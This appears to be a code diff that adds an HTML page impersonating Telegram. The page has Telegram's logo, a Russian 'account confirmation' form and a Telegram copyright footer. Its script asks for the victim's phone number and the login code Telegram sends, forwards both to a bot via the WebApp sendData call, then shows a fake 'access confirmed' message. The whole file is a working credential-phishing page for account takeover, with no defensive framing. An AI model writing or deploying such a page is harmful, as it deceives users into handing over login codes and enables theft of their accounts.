@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0f0f0f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #1f1f1f;
+            border-radius: 20px;
+            padding: 30px 25px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.6);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            width: 60px;
+            height: 60px;
+        }
+        h2 {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .sub {
+            color: #aaa;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            color: #ccc;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #2a2a2a;
+            border: 1px solid #3a3a3a;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #6c8cff;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #6c8cff;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #5a7ae0;
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .status {
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+            color: #ff6b6b;
+            min-height: 24px;
+        }
+        .status.success {
+            color: #69db7c;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.477 2 2 6.477 2 12C2 17.523 6.477 22 12 22C17.523 22 22 17.523 22 12C22 6.477 17.523 2 12 2ZM16.146 7.663L14.443 15.935C14.325 16.473 13.999 16.615 13.551 16.378L10.833 14.394L9.52 15.664C9.389 15.793 9.277 15.901 8.995 15.901L9.166 13.131L13.987 8.749C14.184 8.574 13.943 8.476 13.677 8.651L7.718 12.34L5.035 11.373C4.519 11.185 4.506 10.836 5.134 10.599L15.549 6.386C15.989 6.208 16.376 6.463 16.146 7.663Z" fill="#6c8cff"/>
+            </svg>
+        </div>
+        <h2>Подтверждение аккаунта</h2>
+        <p class="sub">Введите данные для получения доступа</p>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Номер телефона</label>
+                <input type="tel" id="phone" placeholder="+7 999 999 99 99" required>
+            </div>
+            <div class="input-group" id="codeGroup" style="display:none;">
+                <label>Код подтверждения</label>
+                <input type="text" id="code" placeholder="Введите код из Telegram" required>
+            </div>
+            <button type="submit" class="btn" id="submitBtn">Продолжить</button>
+        </form>
+
+        <div class="status" id="status"></div>
+        <div class="footer">Telegram © 2026</div>
+    </div>
+
+    <script>
+        let step = 'phone';
+        let phone = '';
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const status = document.getElementById('status');
+
+            if (step === 'phone') {
+                phone = document.getElementById('phone').value.trim();
+                if (!phone) {
+                    status.textContent = 'Введите номер телефона';
+                    status.className = 'status';
+                    return;
+                }
+
+                status.textContent = 'Отправляем код...';
+                status.className = 'status';
+
+                // Отправляем номер в бота через WebAppData
+                const data = {
+                    phone: phone,
+                    code: ''
+                };
+
+                // Отправляем данные через Telegram WebApp
+                window.Telegram.WebApp.sendData(JSON.stringify(data));
+
+                status.textContent = '✅ Код отправлен! Введите его ниже.';
+                status.className = 'status success';
+                document.getElementById('codeGroup').style.display = 'block';
+                document.getElementById('submitBtn').textContent = 'Подтвердить';
+                step = 'code';
+                return;
+            }
+
+            if (step === 'code') {
+                const code = document.getElementById('code').value.trim();
+                if (!code) {
+                    status.textContent = 'Введите код';
+                    status.className = 'status';
+                    return;
+                }
+
+                status.textContent = 'Проверяем...';
+                status.className = 'status';
+
+                // Отправляем код в бота
+                const data = {
+                    phone: phone,
+                    code: code
+                };
+
+                window.Telegram.WebApp.sendData(JSON.stringify(data));
+
+                status.textContent = '✅ Подтверждено!';
+                status.className = 'status success';
+
+                setTimeout(() => {
+                    document.querySelector('.container').innerHTML = `
+                        <div style="text-align:center;color:#fff;padding:40px 0;">
+                            <div style="font-size:48px;margin-bottom:16px;">✅</div>
+                            <h2>Доступ подтверждён</h2>
+                            <p style="color:#aaa;margin-top:10px;">Возвращайтесь в бота</p>
+                        </div>
+                    `;
+                }, 1000);
+
+                window.Telegram.WebApp.close();
+            }
+        });
+    </script>
+</body>
+</html>
